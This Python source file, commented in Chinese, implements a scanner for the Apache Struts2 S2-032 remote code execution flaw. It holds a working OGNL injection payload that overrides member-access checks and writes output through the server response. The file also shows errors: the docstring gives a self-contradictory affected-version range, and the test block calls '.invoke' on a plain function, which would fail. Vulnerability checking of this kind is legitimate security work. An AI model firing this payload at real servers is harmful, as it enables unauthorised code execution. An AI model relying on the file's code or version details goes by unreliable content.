# -*- coding:utf-8 -*-
"""
Struts2漏洞POC验证工具
封装backend.poc.struts2模块
"""

from typing import Dict, Any


def struts2_s2_032(target: str, timeout: int = 10) -> Dict[str, Any]:
    """Struts2 S2-032 远程代码执行漏洞检测工具
    
    检测目标是否存在Apache Struts2动态方法调用远程代码执行漏洞(S2-032)。
    攻击者可以通过构造恶意的OGNL表达式来执行任意代码。
    
    影响版本:
    - Struts 2.3.20 - Struts 2.3.28(开启 DMI)
    - Struts 2.3.29 - Struts 2.3.28.1(关闭 DMI)
    
    检测原理:
    通过发送包含OGNL表达式的GET请求，尝试执行代码并输出测试字符串。
    如果服务器响应中包含测试字符串，则说明存在漏洞。
    
    Args:
        target: 目标URL，如 http://127.0.0.1:8080
        timeout: 请求超时时间(秒)，默认10秒
        
    Returns:
        包含检测结果的字典，包括：
        - success: 执行状态(True/False)
        - data: 执行结果数据
        - error: 错误信息(成功时为None)
        - metadata: 元数据(工具名称、目标、漏洞信息等)
    """
    try:
        import requests
        
        target_url = target.rstrip('/')
        poc = '032'
        payload = {
            'method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(#parameters.poc[0]),#writer.flush(),#writer.close': '',
            'poc': poc
        }
        
        r = requests.get(target_url, params=payload, timeout=timeout)
        
        if poc in r.text:
            return {
                "success": True,
                "data": {
                    "vulnerable": True,
                    "cve_id": "S2-032",
                    "vulnerability": "Struts2 S2-032 Remote Code Execution",
                    "target": target_url
                },
                "error": "",
                "metadata": {
                    "tool": "struts2_s2_032",
                    "target": target,
                    "cve_id": "S2-032",
                    "severity": "critical"
                }
            }
        else:
            return {
                "success": True,
                "data": {
                    "vulnerable": False,
                    "cve_id": "S2-032",
                    "target": target_url
                },
                "error": "",
                "metadata": {
                    "tool": "struts2_s2_032",
                    "target": target,
                    "cve_id": "S2-032"
                }
            }
    except ImportError as e:
        return {
            "success": False,
            "data": {},
            "error": f"导入requests模块失败: {str(e)}",
            "metadata": {"tool": "struts2_s2_032", "target": target}
        }
    except Exception as e:
        return {
            "success": False,
            "data": {},
            "error": f"执行struts2_s2_032工具异常: {str(e)}",
            "metadata": {"tool": "struts2_s2_032", "target": target}
        }


if __name__ == "__main__":
    test_result2 = struts2_s2_032.invoke("http://127.0.0.1:8080")
    print(test_result2)
